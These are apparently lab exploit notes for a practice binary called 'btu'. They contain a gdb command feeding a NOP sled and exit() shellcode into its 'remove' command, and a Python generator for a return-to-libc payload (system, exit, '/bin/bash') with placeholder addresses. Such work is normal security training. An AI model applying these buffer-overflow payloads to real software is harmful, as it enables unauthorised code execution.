'''
gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
'''

#!/usr/bin/python3 

# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
import sys 


# Fill content with non-zero values 
content = bytearray(0x90 for i in range(16)) 

# adding the basepointer address 
base_pointer_address = 0x11111111

content[0:4] = (base_pointer_address).to_bytes(4, byteorder='little' )


system_addr = 0xaaaaaaaa # The address of exmatriculate 

content[4:8] = (system_addr).to_bytes(4, byteorder='little' )


exit_addr = 0xbbbbbbbb # The address of exit () 

content[8:12] = (exit_addr).to_bytes(4, byteorder='little' ) 

bin_bash = 0xcccccccc# address of bin_bash object. 
content[12:16] = (bin_bash).to_bytes(4, byteorder='little') 



# Print the final payload in escaped format for gdb --args
escaped = ''.join('\\x{:02x}'.format(b) for b in content)



print(f'gdb --args ./build/bin/btu add $(echo -e "{escaped}")')

